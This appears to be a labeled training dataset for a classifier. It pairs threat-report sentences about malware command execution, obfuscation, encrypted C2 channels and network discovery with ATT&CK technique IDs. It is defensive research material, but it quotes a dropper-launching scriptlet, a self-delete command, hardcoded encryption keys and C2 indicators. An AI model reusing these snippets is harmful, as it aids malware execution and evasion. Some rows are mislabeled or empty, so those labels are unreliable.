,sentence,label_tec
37,Remote Shell:  The function above is seen throughout many of the binaries in the Mirage family and is executed when a command is sent from the C&C,T1059
38,"It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)",T1059
39,This ID is sent to the CnC with each request for commands to execute,T1059
40,"Supported commands “upload“, “screenshot“, “Excel“, “Outlook“, “risk“, “reboot“, “shutdown“, “clean“",T1059
41,"Both create one thread, and each thread is responsible for either downloading and executing the file or running a command line program in the terminal:   Figure 28. Commands used for downloading and executing, and running a command in terminal   Figure 29. Commands used in uploading and downloading file Figure 30",T1059
42,"Traps provides endpoint protection, as it can block Excel from creating a command prompt process",T1059
43,"For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands",T1059
44,"cmd.exe /C choice /C Y /N /D Y /T 2 & Del After sleeping, the Trojan will create a GUID and write it to %APPDATA%\Windows\GDI.bin",T1059
45,"Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments",T1059
46,The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\tmpCa.vbs,T1059
47,"The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute any scripts/commands and receive the result via HTTP requests",T1059
48,"The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute scripts/commands and receive the results via HTTP requests",T1059
49,"<?XML version=”1.0″?> <scriptlet> <registration description=”fjzmpcjvqp” progid=”fjzmpcjvqp” version=”1.00″ classid=”{204774CF-D251-4F02-855B-2BE70585184B}” remotable=”true” > </registration> <script language=”JScript”> <![CDATA[ var r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c %tmp%\\qrat.exe”,0,false); exit(); ]]> </script> </scriptlet> After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\Users\%username%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe",T1059
50,"C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:    Command Description   0 Kill BADNEWS",T1059
51,Access remote objects interactively from the pupy shell and get auto-completion of remote attributes,T1059
52,Execute noninteractive commands on multiple hosts at once,T1059
53,Open interactive python shells with auto-completion on the all-in-memory remote python interpreter,T1059
54,"Interactive shells (cmd.exe, /bin/bash, etc) can be opened remotely",T1059
55,Remote shells on Unix & Windows clients have a real tty with all keyboard signals working just like an SSH shell,T1059
56,Figure 1: SpeakUp’s Victim Distribution  Figure 2: SpeakUp’s propagation rate per day Infection Vector The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor,T1059
57,"Figure 6: SpeakUp receives additional commands to execute, this time in plain text",T1059
58,Command execution Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device,T1059
59,"BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration",T1059
60,MURKYTOP: a command-line reconnaissance tool,T1059
61,"The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands",T1059
62,"The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018",T1059
63,"It is used to create new processes, perform as a command line shell, and several other tasks",T1059
64,The starred commands are undocumented commands,T1059
65,"Its presence on a compromised system allows a threat actor to execute a wide variety of commands, including uploading and downloading files, and spawning a reverse shell",T1059
66,UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe,T1059
67,This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system,T1059
68,"We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1",T1059
69,nan,T1059
70,Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities,T1027
71,"For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples",T1027
72,"That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload",T1027
73,Messages are encrypted using AES with a static key,T1027
74,The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload,T1027
75,"After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces’ pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word",T1027
76,The code is obfuscated in order to hide any malicious activity on the remote server,T1027
77,Bxaki obfuscated function,T1027
78,This strangeness was related to values listed in newer BlackEnergy configuration files,T1027
79,Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below),T1027
80,"Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related plugin could be found",T1027
81,It is prepended to the encrypted and encoded message,T1027
82,The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed,T1027
83,Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more difficult,T1027
84,This build tool encrypts the binary’s strings with a fresh key for each build,T1027
85,Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1,T1027
86,"The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017",T1027
87,Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim’s data,T1027
88,Configuration Config.ini is the file where the malware stores its encrypted configuration data,T1027
89,These requests are encrypted using the RC4 algorithm,T1027
90,"While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload",T1027
91,"Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state",T1027
92,The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks,T1027
93,APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property,T1027
94,"When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle’s targets were initially compromised",T1027
95,WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script,T1027
96,Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult,T1027
97,"Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\system32), the encrypted backdoor is located in a different directory (%Program Files%\Common Files\System\ado)",T1027
98,All strings used by the Trojan are encrypted with the XOR algorithm,T1027
99,"Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor’s body)",T1027
100,"11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with “-” and “_”",T1027
101,"Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added",T1027
102,The first 11 bytes of the received buffer are encrypted with the XOR algorithm,T1027
103,"Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64",T1027
104,"The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers",T1027
105,These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer,T1027
106,Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES,T1027
107,"Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related",T1027
108,"Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2",T1027
109,The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE,T1027
110,Malicious obfuscated VBA code is executed when the macro is first enabled,T1027
111,"The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions",T1027
112,"After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works",T1027
113,"The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload — which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode — is a .NET PE file that's obfuscated with ConfuserEx",T1027
114,"In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code",T1027
115,"Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language",T1027
116,"There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string",T1027
117,All strings below are encrypted via AES256 and base64 encoding,T1027
118,"Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation",T1027
119,"At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character",T1027
120,"The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run",T1027
121,A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation,T1027
122,This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses,T1027
123,"Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell",T1027
124,"Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex",T1027
125,"By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog",T1027
126,All the strings and settings were encrypted and obfuscated,T1027
127,The configuration and strings are encrypted using 3DES and Base64 encoding,T1027
128,The C&C server then replies with the encrypted serialized configuration,T1027
129,The shellcode is not encrypted but is obfuscated,T1027
130,"Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed",T1027
131,The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value,T1027
132,The configuration blob is encoded using a simple single-byte XOR scheme,T1027
133,"KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)",T1027
134,The payload (abbad7acd…) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor,T1027
135,"Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64",T1027
136,Some strings are obfuscated with XOR x56,T1027
137,These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”,T1027
138,The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \x36\x11\xdd\x08\xac\x4b\x72\xf8\x51\x04\x68\x2e\x3e\x38\x64\x32,T1027
139,"This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}",T1027
140,We’ve identified two such files: settings.db sdfg3d.db Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration,T1027
141,"The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated",T1027
142,"Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document",T1027
143,HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming,T1027
144,"Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way",T1027
145,"All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks",T1027
146,Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section,T1027
147,"PlayList.vbs contains the obfuscated codes, which it executes after decrypting the obfuscations.",T1027
148,"Once executed, Vcrodat loads an encrypted payload on to the victim’s computer.",T1027
149,Figure 3 shows this webshell’s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter,T1027
150,"The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.",T1027
151,The JavaScript is heavily obfuscated. The first variable—a—is an array of obfuscated values,T1027
152,This shellcode is decrypted in memory through EQENDT32.EXE,T1027
153,The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation.,T1027
154,"The ""Blackwater.bas"" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer.",T1027
155,"The actors have made some small changes, such as altering the variable names to avoid Yara detection",T1027
156,"To operate and evade standard analysis tools, most of the functions are hashed",T1027
157,Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.,T1027
158,"Figure 6: Assembly view of Sample 3 root installation related byte arrays As it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account",T1573
159,The encryption/decryption routine (refer to Figure 5) can be summarized as follows:      Figure 5: Encryption/ Decryption Function  Generate an array of integers from 0x00 to 0xff Scrambles the state of the table using the given key Encrypts or decrypts a string using the scrambled table from (b),T1573
160,"Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session",T1573
161,"A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code",T1573
162,"After applying this decryption algorithm, we are presented with the following data: h=HOSTNAME-PC&f=mission.ini&c=& The response made by the C2 server uses the same RC4 key for encryption",T1573
163,"The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server",T1573
164,"Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response",T1573
165,The structure of each of these outbound DNS requests is as follows: <system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain> The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2,T1573
166,"The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie",T1573
167,"<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>   After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command",T1573
168,"Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:   <encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>   To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers",T1573
169,"The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:   www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>   The payload will treat the data provided by the C2 as a message, which will have the following structure:   hello<char uuid[35]><char type[1]><data>   The message will start with the string hello followed by a 35-character UUID string",T1573
170,"Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign",T1016
171,"Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before",T1016
172,"Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post",T1016
173,"In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines",T1016
174,APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration,T1016
175,"In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain",T1016
176,"Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to",T1016
177,"By running SSH on the server in a compromised network, attackers can come back to the network whenever they want",T1016
178,Note that IP addresses can be reallocated,T1016
179,"Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations",T1016
180,"It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway",T1016
181,"Regular Expressions   ([^r-v\\s])[r-v]([\\w\\d+\\/=]+)-\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\w|:]+){1,8})   Address:\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\s]+)[r-v]([\\w\\d+\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\s+(\\d+.\\d+.\\d+.\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers",T1016
182,"Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123",T1016
183,"This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure",T1016
184,"This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization’s name",T1016
185,"After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with",T1016
186,DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network,T1016
187,"FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S",T1016
188,"If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie",T1016
189,"DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems",T1016
190,The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system,T1016
191,"When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network",T1016
192,text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list,T1016
193,Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses,T1016
194,"The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called “SetLog2”, which sets variables for the system’s IP address, MAC address and hostname",T1016
195,"The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system",T1016
196,"Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a “campaign identifier.” Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets",T1016
197,Victim system reconnaissance The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”,T1016
198,"The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim",T1016
199,"If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1",T1016
200,"It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure",T1016
201,The email address is associated with the Lebanese domain of a major global financial institution,T1016
202,"Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017",T1016
203,"The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command ""05 01 00 01 c0 b8 3c e5 00 51"" and verifies that the first two bytes from the server are ""05 00"" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)",T1016
204,"The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",T1016
205,"The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",T1016
206,"The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org",T1016
207,Network Indicators​     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking,T1016
208,chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents,T1016
209,fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents,T1016
210,mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents,T1016
211,"In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97",T1016
212,Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies,T1016
213,"One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address",T1016
214,"The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two",T1016
215,"RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation",T1016
